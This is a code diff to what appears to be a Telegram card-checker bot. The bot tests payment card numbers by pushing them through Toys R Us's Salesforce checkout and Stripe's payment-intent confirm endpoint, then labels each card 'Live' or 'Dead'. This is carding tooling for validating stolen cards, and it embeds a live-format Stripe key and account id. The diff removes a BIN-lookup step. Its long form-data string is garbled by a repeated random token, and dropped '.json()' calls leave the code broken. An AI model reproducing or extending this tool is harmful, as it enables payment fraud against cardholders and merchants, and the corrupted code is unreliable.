@@ -734,7 +734,7 @@ async def chhk(message: types.Message):
     'zoneId': 'default',
     'statementDescriptor': None,}
 
-    response2 = requests.post('https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/__SYSTEM__SalesforcePayments-PreparePaymentIntent', cookies=cookies, headers=headers, json=json_data).json()
+    response2 = requests.post('https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/__SYSTEM__SalesforcePayments-PreparePaymentIntent', cookies=cookies, headers=headers, json=json_data)
  
     CS = response2["clientSecret"]
     PI =CS.split('_sec')[0]
@@ -761,7 +761,7 @@ async def chhk(message: types.Message):
 
     data = f'setup_future_usage=off_session&payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=strate+4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVstate]=NY&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=testnici1%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVphone]=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVcard][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=37ae7a60-ea56-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVpayment_method_data[sid]=32e98acc-3a46-4b4a-a908-f6f8ec519082760817&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc58a815e4%3B+stripe-js-v3%2Fc58a815e4&payment_method_data[time_on_page]=107717&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HbsUNBP9OQuEIrPQTov2wZCQlEOC0EniZrH71zXu970tAaLxliYcvffDyHgP3wO9xrKbrfY4TGDVgViEUjwQ4mL00oKOvo8WJ&_stripe_account=acct_1JNK02Pl154QSdJg&client_secret={CS}'
 
-    response = requests.post(f'https://api.stripe.com/v1/payment_intents/{PI}/confirm', headers=headers, data=data).json()
+    response = requests.post(f'https://api.stripe.com/v1/payment_intents/{PI}/confirm', headers=headers, data=data)
 
     error = response["error"]
     codel = error["code"]
@@ -871,23 +871,6 @@ SMG : Your card number is incorrect.</b>
         token = response.json()['id']
         tad = response.json()
         card = tad['card']
-
-        apis = requests.get(f"https://bins-su-ani.vercel.app/api/{cc}").json()
-
-        result=apis['result']
-        msg=apis['message']
-        data=apis['data']
-        vendor=data['vendor']
-        bn=data['bin']
-        typ=data['type']
-        lv=data['level']
-        bank=data['bank']
-        country=data['country']
-        countryinfo=data['countryInfo']
-        name=countryinfo['name']
-        emoji=countryinfo['emoji']
-        cd=countryinfo['code']
-        dialCode=countryinfo['dialCode']
         
         cookies = {
             '_ga': 'GA1.2.929401543.1672862249',
@@ -942,11 +925,6 @@ CC Dead ❌
 cc : <code>{ccs}</code>
 Status : Decline
 msg : Your card was declined.
-‗‗‗‗‗‗‗‗‗‗‗‗‗‗
-Bin: {bn}
-Data: {vendor} {typ} {lv}
-BANK: {bank}
-COUNTRY : {country} {name} {emoji} {cd}</b>
 """)
         else:
             await message.reply(f"""<b>
@@ -955,10 +933,6 @@ CC Live ✅
 cc : <code>{ccs}</code>
 SMG : Aproved
 ‗‗‗‗‗‗‗‗‗‗‗‗‗‗
-Bin: {bn}
-Data: {vendor} {typ} {lv}
-BANK: {bank}
-COUNTRY : {country} {name} {emoji} {cd}
 
 </b>""")
 
